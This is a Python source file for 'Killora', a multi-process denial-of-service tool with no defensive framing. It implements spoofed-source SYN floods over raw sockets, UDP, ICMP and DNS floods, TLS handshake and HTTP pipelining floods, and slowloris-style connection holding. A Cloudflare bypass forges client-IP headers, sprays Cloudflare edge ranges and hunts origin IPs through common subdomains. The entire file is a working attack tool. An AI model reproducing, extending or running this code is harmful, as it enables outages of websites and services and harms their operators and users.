#!/usr/bin/env python3
# killora.py - engine for Killora by BrokenCodeZ
import asyncio, ipaddress, multiprocessing as mp, os, random, resource
import socket, ssl, struct, sys, time

CF_NETS = [ipaddress.ip_network(n) for n in (
    "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
    "141.101.64.0/18", "108.162.192.0/18", "190.93.240.0/20", "188.114.96.0/20",
    "197.234.240.0/22", "198.41.128.0/17", "162.158.0.0/15", "104.16.0.0/13",
    "104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22")]
CF_PORTS = [443, 2053, 2083, 2087, 2096, 8443, 80, 8080, 8880, 2052,
            2082, 2086, 2095]
TLS_PORTS = {443, 2053, 2083, 2087, 2096, 8443}
SUBS = ["direct", "origin", "origin-www", "direct-www", "ftp", "mail", "ssh",
        "cpanel", "webmail", "dev", "staging", "api", "backend", "old", "new",
        "server", "host", "portal", "admin", "vpn", "internal", "gateway"]
UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Mobile Safari/537.36"]
C1 = "\033[1;36m"; C2 = "\033[1;35m"; C3 = "\033[1;33m"
C4 = "\033[1;32m"; CR = "\033[1;31m"; N = "\033[0m"
EDGE = []


class Cfg:
    def __init__(self, host, port, count, dur):
        self.host = host
        self.port = port
        self.count = count
        self.sent = 0
        self.fail = 0
        self.bytes = 0
        self.ip = None
        self.origins = []
        self.stop = False
        self.t0 = time.monotonic()
        self.deadline = self.t0 + dur
        self.shared = None

    def live(self):
        return (not self.stop and time.monotonic() < self.deadline
                and (self.count == 0 or self.sent < self.count))


def is_cf(ip):
    try:
        a = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return any(a.version == 4 and a in n for n in CF_NETS)


def resolve(host):
    try:
        infos = socket.getaddrinfo(host, None)
    except socket.gaierror:
        return []
    out = []
    for i in infos:
        if i[4][0] not in out:
            out.append(i[4][0])
    return out


def build_edge_pool(per=160):
    for net in CF_NETS:
        base = int(net.network_address)
        for _ in range(per):
            EDGE.append(str(ipaddress.ip_address(
                base + random.randrange(1, max(net.num_addresses - 1, 2)))))


def csum(d):
    if len(d) % 2:
        d += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(d) // 2), d))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def rnd_ip():
    return "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255),
                            random.randint(0, 255), random.randint(1, 254))


def tcp_pkt(src, dst, sp, dp, flags):
    ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.randint(0, 65535),
                     0x4000, 64, socket.IPPROTO_TCP, 0,
                     socket.inet_aton(src), socket.inet_aton(dst))
    ip = ip[:10] + struct.pack("!H", csum(ip)) + ip[12:]
    tcp = struct.pack("!HHIIBBHHH", sp, dp, random.randint(0, 2**32 - 1),
                      0, 0x50, flags, 65535, 0, 0)
    ph = struct.pack("!4s4sBBH", socket.inet_aton(src), socket.inet_aton(dst),
                     0, socket.IPPROTO_TCP, len(tcp))
    tcp = tcp[:16] + struct.pack("!H", csum(ph + tcp)) + tcp[18:]
    return ip + tcp


def dns_pkt(n):
    h = struct.pack("!HHHHHH", random.randint(0, 65535), 0x0100, 1, 0, 0, 0)
    q = b"".join(bytes([len(p)]) + p.encode() for p in n.split(".")) + b"\x00"
    return h + q + struct.pack("!HH", 1, 1)


def icmp_pkt():
    i, s, p = random.randint(0, 65535), random.randint(0, 65535), os.urandom(32)
    h = struct.pack("!BBHHH", 8, 0, 0, i, s)
    return struct.pack("!BBHHH", 8, 0, csum(h + p), i, s) + p


def cf_headers():
    h = {}
    for k in ("X-Forwarded-For", "X-Real-IP", "CF-Connecting-IP",
              "True-Client-IP", "X-Originating-IP", "Client-IP"):
        h[k] = rnd_ip()
    h["Forwarded"] = "for=" + rnd_ip()
    return h


def bust():
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=14))


def tls_ctx():
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    c.set_ciphers("DEFAULT@SECLEVEL=1")
    return c


def req_bytes(host, post=False, size=0):
    path = "POST" if post else "GET"
    h = ["%s /?%s HTTP/1.1" % (path, bust()), "Host: " + host,
         "User-Agent: " + random.choice(UA), "Accept: */*",
         "Accept-Encoding: gzip, deflate, br", "Connection: keep-alive",
         "Cache-Control: no-cache", "Pragma: no-cache",
         "Referer: https://" + host + "/"]
    for k, v in cf_headers().items():
        h.append("%s: %s" % (k, v))
    if post:
        b = os.urandom(size)
        h.append("Content-Type: application/octet-stream")
        h.append("Content-Length: %d" % len(b))
        return ("\r\n".join(h) + "\r\n\r\n").encode() + b
    return ("\r\n".join(h) + "\r\n\r\n").encode()


def pick_target(cfg):
    if cfg.origins and random.random() < 0.72:
        return random.choice(cfg.origins), cfg.port, True
    if EDGE and random.random() < 0.9:
        return random.choice(EDGE), random.choice(CF_PORTS), True
    return cfg.ip, cfg.port, True


async def flush(cfg):
    l = [0, 0, 0]
    while not cfg.stop:
        await asyncio.sleep(0.2)
        s, f, b = cfg.shared
        with s.get_lock():
            s.value += cfg.sent - l[0]
        with f.get_lock():
            f.value += cfg.fail - l[1]
        with b.get_lock():
            b.value += cfg.bytes - l[2]
        l = [cfg.sent, cfg.fail, cfg.bytes]


def summary(cfg):
    el = time.monotonic() - cfg.t0
    print("\n  %sDONE%s sent=%d fail=%d %.1fs avg=%.0f/s %.1fMB"
          % (C4, N, cfg.sent, cfg.fail, el, cfg.sent / max(el, .01),
             cfg.bytes / 1e6), flush=True)


async def drive(cfg, worker, n):
    cfg.shared = (mp.Value("Q", 0), mp.Value("Q", 0), mp.Value("Q", 0))
    fl = asyncio.create_task(flush(cfg))
    await asyncio.gather(*[asyncio.create_task(worker()) for _ in range(n)],
                         return_exceptions=True)
    cfg.stop = True
    await asyncio.sleep(0.3)
    fl.cancel()
    summary(cfg)


def need_root():
    if os.geteuid() != 0:
        print(CR + "  root chahiye" + N)
        sys.exit(1)


# ---------------- workers ----------------
async def udp_worker(cfg):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setblocking(False)
    p = os.urandom(1200)
    while cfg.live():
        for _ in range(64):
            try:
                s.sendto(p, (cfg.ip, cfg.port))
                cfg.bytes += 1200
            except OSError:
                cfg.fail += 1
            cfg.sent += 1
            if not cfg.live():
                break
        await asyncio.sleep(0)


async def syn_worker(cfg):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    while cfg.live():
        for _ in range(256):
            try:
                s.sendto(tcp_pkt(rnd_ip(), cfg.ip, random.randint(1024, 65535),
                                 cfg.port, 0x02), (cfg.ip, 0))
            except OSError:
                cfg.fail += 1
            cfg.sent += 1
            if not cfg.live():
                break
        await asyncio.sleep(0)


async def icmp_worker(cfg):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    while cfg.live():
        for _ in range(128):
            try:
                s.sendto(icmp_pkt(), (cfg.ip, 0))
                cfg.bytes += 40
            except OSError:
                cfg.fail += 1
            cfg.sent += 1
            if not cfg.live():
                break
        await asyncio.sleep(0)


async def dns_worker(cfg):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setblocking(False)
    while cfg.live():
        for _ in range(64):
            try:
                s.sendto(dns_pkt("%s.%s" % (bust(), cfg.host)), (cfg.ip, cfg.port))
                cfg.bytes += 60
            except OSError:
                cfg.fail += 1
            cfg.sent += 1
            if not cfg.live():
                break
        await asyncio.sleep(0)


async def tls_worker(cfg):
    ctx = tls_ctx()
    while cfg.live():
        ip, port, _ = pick_target(cfg)
        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(ip, port, ssl=ctx,
                                        server_hostname=cfg.host), 5)
            w.close()
            cfg.sent += 1
        except Exception:
            cfg.fail += 1
            cfg.sent += 1


async def pipe_worker(cfg, pool, post, size):
    while cfg.live():
        ip, port, _ = pick_target(cfg)
        ctx = tls_ctx() if port in TLS_PORTS else None
        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(ip, port, ssl=ctx,
                                        server_hostname=cfg.host if ctx else None), 5)
            w.transport.get_extra_info("socket")
            for _ in range(24):
                if not cfg.live():
                    break
                w.write(random.choice(pool))
                cfg.sent += 1
                cfg.bytes += 400 + (size if post else 0)
            await asyncio.wait_for(w.drain(), 5)
            w.close()
        except Exception:
            cfg.fail += 1
            cfg.sent += 1


async def tcp_worker(cfg):
    req = req_bytes(cfg.host)
    while cfg.live():
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(cfg.ip, cfg.port), 5)
            w.write(req)
            cfg.sent += 1
            w.close()
        except Exception:
            cfg.fail += 1
            cfg.sent += 1


async def slow_worker(cfg):
    hb = cfg.host.encode()
    while cfg.live():
        try:
            r, w = await asyncio.open_connection(cfg.ip, cfg.port)
            w.write(b"GET /?" + bust().encode() + b" HTTP/1.1\r\nHost: " + hb +
                    b"\r\nUser-Agent: " + random.choice(UA).encode() + b"\r\n")
            await w.drain()
            cfg.sent += 1
            for _ in range(40):
                if not cfg.live():
                    break
                await asyncio.sleep(4)
                w.write(b"X-k: " + bust().encode() + b"\r\n")
                await w.drain()
            w.close()
        except Exception:
            cfg.fail += 1
            cfg.sent += 1


# ---------------- origin hunt (background) ----------------
async def hunt(cfg, log):
    loop = asyncio.get_running_loop()
    for sub in SUBS:
        if cfg.stop:
            return
        cand = "%s.%s" % (sub, cfg.host)
        try:
            ips = await loop.run_in_executor(None, resolve, cand)
        except Exception:
            continue
        for ip in ips:
            if is_cf(ip) or ip in cfg.origins:
                continue
            cfg.origins.append(ip)
            if log:
                print("  %s[+]%s origin: %s -> %s" % (C4, N, cand, ip), flush=True)


# ---------------- AUTO ----------------
async def auto(cfg, root):
    pool_post = [req_bytes(cfg.host, True, 3072) for _ in range(192)]
    pool_get = [req_bytes(cfg.host, False, 0) for _ in range(192)]
    hunt_task = asyncio.create_task(hunt(cfg, True))
    tasks = []
    for _ in range(10):
        tasks.append(asyncio.create_task(pipe_worker(cfg, pool_post, True, 3072)))
    for _ in range(6):
        tasks.append(asyncio.create_task(pipe_worker(cfg, pool_get, False, 0)))
    for _ in range(4):
        tasks.append(asyncio.create_task(tls_worker(cfg)))
    if root:
        for _ in range(2):
            tasks.append(asyncio.create_task(syn_worker(cfg)))
        tasks.append(asyncio.create_task(icmp_worker(cfg)))
    await asyncio.gather(*tasks, return_exceptions=True)
    hunt_task.cancel()


def child(mode, host, port, count, dur):
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (1 << 20, 1 << 20))
    except Exception:
        pass
    cfg = Cfg(host, port, count, dur)
    ips = resolve(host)
    if not ips:
        print(CR + "  resolve fail" + N, flush=True)
        return
    cfg.ip = ips[0]
    root = os.geteuid() == 0

    if mode == "auto":
        asyncio.run(drive(cfg, lambda: auto(cfg, root), 1))
    elif mode == "udp":
        asyncio.run(drive(cfg, lambda: udp_worker(cfg), 2))
    elif mode == "syn":
        asyncio.run(drive(cfg, lambda: syn_worker(cfg), 2))
    elif mode == "icmp":
        asyncio.run(drive(cfg, lambda: icmp_worker(cfg), 2))
    elif mode == "dns":
        asyncio.run(drive(cfg, lambda: dns_worker(cfg), 4))
    elif mode == "tls":
        asyncio.run(drive(cfg, lambda: tls_worker(cfg), 400))
    elif mode == "tcp":
        asyncio.run(drive(cfg, lambda: tcp_worker(cfg), 200))
    elif mode == "slow":
        asyncio.run(drive(cfg, lambda: slow_worker(cfg), 2))
    elif mode == "http":
        pool = [req_bytes(host) for _ in range(192)]
        asyncio.run(drive(cfg, lambda: pipe_worker(cfg, pool, False, 0), 400))
    elif mode == "tunnel":
        pool = [req_bytes(host, True, 2048) for _ in range(192)]
        asyncio.run(drive(cfg, lambda: pipe_worker(cfg, pool, True, 2048), 500))
    elif mode == "mixed":
        asyncio.run(drive(cfg, lambda: asyncio.gather(
            udp_worker(cfg), syn_worker(cfg), return_exceptions=True), 2))


def main():
    if len(sys.argv) < 7:
        sys.exit("usage: killora.py <mode> <host> <port> <count> <dur> <procs>")
    mode, host = sys.argv[1], sys.argv[2]
    port, count, dur, procs = (int(sys.argv[3]), int(sys.argv[4]),
                               int(sys.argv[5]), int(sys.argv[6]))

    print("\n  %sKILLORA%s -> %s:%d mode=%s procs=%d dur=%ds\n"
          % (C2, N, host, port, mode, procs, dur))

    ips = resolve(host)
    if not ips:
        sys.exit(CR + "  resolve fail: " + host + N)

    if mode == "check":
        print("  IPs: " + ", ".join(ips))
        cf = any(is_cf(i) for i in ips)
        print("  Cloudflare: " + (CR + "YES" + N if cf else C4 + "NO" + N))
        if cf:
            print("  edge/tunnel detected -> auto mode best")
        for sub in SUBS:
            for ip in resolve("%s.%s" % (sub, host)):
                if not is_cf(ip):
                    print("  %s[+]%s %s -> %s" % (C4, N, sub, ip))
        return

    if mode in ("syn", "icmp", "mixed") or (mode == "auto" and os.geteuid() != 0):
        if os.geteuid() != 0:
            need_root()

    build_edge_pool()

    chunk = max(count // procs, 1) if count else 0
    jobs = []
    for i in range(procs):
        n = (chunk if i < procs - 1 else max(count - chunk * (procs - 1), 1)) if count else 0
        p = mp.Process(target=child, args=(mode, host, port, n, dur))
        p.start()
        jobs.append(p)

    t0 = time.monotonic()
    try:
        while any(p.is_alive() for p in jobs):
            time.sleep(1)
            print("  %s[%5.1fs]%s %d procs live" % (C1, time.monotonic() - t0, N,
                                                    sum(p.is_alive() for p in jobs)),
                  flush=True)
    except KeyboardInterrupt:
        for p in jobs:
            p.terminate()
    for p in jobs:
        p.join()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n  interrupted")